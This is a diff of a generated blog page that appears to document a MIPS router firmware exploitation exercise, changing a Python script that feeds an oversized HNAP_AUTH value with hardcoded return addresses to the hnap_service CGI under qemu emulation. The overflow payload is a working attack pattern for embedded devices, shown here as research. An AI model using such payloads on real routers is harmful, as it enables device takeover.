-</span></span><span class="line"><span class="cl">REQUEST_METHOD=b&#34;POST&#34;
-</span></span><span class="line"><span class="cl">SOAP_ACTION=b&#34;1&#34;
-</span></span><span class="line"><span class="cl">CONTENT_LENGTH=str(len(soap_body)).encode(&#34;ascii&#34;)
-</span></span><span class="line"><span class="cl">COOKIE=b&#34;uid=&#34;
+</span></span><span class="line"><span class="cl"><span class="n">REQUEST_METHOD</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;POST&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SOAP_ACTION</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">CONTENT_LENGTH</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">soap_body</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">COOKIE</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;uid=111&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">HNAP_AUTH = (
-</span></span><span class="line"><span class="cl">    b&#34;a&#34; * 1100
-</span></span><span class="line"><span class="cl">    + b&#34; \x43\x12\x40&#34;   # 0x00431240
-</span></span><span class="line"><span class="cl">    + b&#34;b&#34; * 32
-</span></span><span class="line"><span class="cl">    + b&#34; \x40\x33\xe8&#34;   # 0x004033E8
-</span></span><span class="line"><span class="cl">)
-</span></span><span class="line"><span class="cl">print(f&#39;HNAP_AUTH: {HNAP_AUTH}&#39;)
+</span></span><span class="line"><span class="cl"><span class="n">HNAP_AUTH</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mi">1036</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x43\x12\x40</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;b&#34;</span> <span class="o">*</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x40\x33\xe8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;HNAP_AUTH: </span><span class="si">{</span><span class="n">HNAP_AUTH</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">subprocess.run(
-</span></span><span class="line"><span class="cl">    [&#39;/qemu-mips-static&#39;, &#39;-g&#39;, &#39;1235&#39;, &#39;/web/cgi-bin/hnap/hnap_service&#39;],
-</span></span><span class="line"><span class="cl">    input=soap_body,
-</span></span><span class="line"><span class="cl">    env={
-</span></span><span class="line"><span class="cl">        &#39;REQUEST_METHOD&#39;: REQUEST_METHOD,
-</span></span><span class="line"><span class="cl">        &#39;SOAP_ACTION&#39;: SOAP_ACTION,
-</span></span><span class="line"><span class="cl">        &#39;CONTENT_LENGTH&#39;: CONTENT_LENGTH,
-</span></span><span class="line"><span class="cl">        &#39;COOKIE&#39;: COOKIE,
-</span></span><span class="line"><span class="cl">        &#39;HNAP_AUTH&#39;: HNAP_AUTH
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">)
+</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="s1">&#39;/qemu-mips-static&#39;</span><span class="p">,</span> <span class="s1">&#39;-g&#39;</span><span class="p">,</span> <span class="s1">&#39;1235&#39;</span><span class="p">,</span> <span class="s1">&#39;/web/cgi-bin/hnap/hnap_service&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">input</span><span class="o">=</span><span class="n">soap_body</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">env</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">:</span> <span class="n">REQUEST_METHOD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;SOAP_ACTION&#39;</span><span class="p">:</span> <span class="n">SOAP_ACTION</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;CONTENT_LENGTH&#39;</span><span class="p">:</span> <span class="n">CONTENT_LENGTH</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;COOKIE&#39;</span><span class="p">:</span> <span class="n">COOKIE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;HNAP_AUTH&#39;</span><span class="p">:</span> <span class="n">HNAP_AUTH</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>注意到一个奇怪的现象，Hnapauth中的普通字符串能直接覆盖寄存器，地址却不行</p>
+</div><img src="38.png" style="width: 100%;" />
 
 </section>
 
@@ -1241,7 +1344,7 @@ unicode: "f6d2"
       共发表文章 
       <span class="number-highlight">33</span> 
       篇 ，总计 
-      <span class="number-highlight">164.58</span> 
+      <span class="number-highlight">165.35</span> 
       k 字
   </div>
   <div>
@@ -1450,9 +1553,9 @@ if (busuanziValue) {
 </style>
 
 
-<script src="/js/renderer.js?v=1792878478"></script>
+<script src="/js/renderer.js?v=1793169668"></script>
 
-<script defer src="/js/codex-bg-motion.js?v=1792878478"></script>
+<script defer src="/js/codex-bg-motion.js?v=1793169668"></script>
 
 
 <script>
